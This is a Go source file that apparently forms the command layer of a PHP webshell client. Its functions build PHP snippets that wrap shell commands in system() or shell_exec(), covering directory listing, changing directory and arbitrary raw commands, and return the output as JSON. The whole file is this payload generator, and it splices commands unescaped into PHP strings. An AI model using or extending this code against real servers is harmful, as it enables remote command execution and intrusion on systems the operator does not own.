package shell

type SHELL struct {
	method  int
	context string
}

func (shl *SHELL) SetContext(str string) {
	shl.context = str
}

func (shl *SHELL) GetContext() string {
	return shl.context
}

func (shl *SHELL) getSystemCMD(cmd, r string) string {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"
}

func (shl *SHELL) getShellExecCMD(cmd, r string) string {
	return "$" + r + "=shell_exec('" + cmd + "');"
}

func (shl *SHELL) createCMD(cmd *string, r string) {
	var contexter, shellCMD string

	if shl.context != "" {
		contexter = "cd " + shl.context + " && "
	}

	shellCMD = contexter + *cmd

	if shl.method == 0 {
		shellCMD = shl.getSystemCMD(shellCMD, r)
	} else if shl.method == 1 {
		shellCMD = shl.getShellExecCMD(shellCMD, r)
	}

	*cmd = shellCMD
}

func (shl *SHELL) Ls(c string) string {
	var context, lsFolder, lsFile, ls string

	if c != "" {
		context = "cd " + c + " && "
	}

	lsFolder = context + "ls -ld */"
	lsFile = context + "ls -lp | grep -v /"

	shl.createCMD(&lsFolder, "a")
	shl.createCMD(&lsFile, "b")

	ls = lsFolder + lsFile + "$r=json_encode(array($a, $b));"

	return ls
}

func (shl *SHELL) Cd(cd string) string {
	cd = cd + " && pwd"
	shl.createCMD(&cd, "r")

	return cd
}

func (shl *SHELL) Raw(r string) string {
	var raw string

	shl.createCMD(&r, "r")
	raw = r

	return raw
}
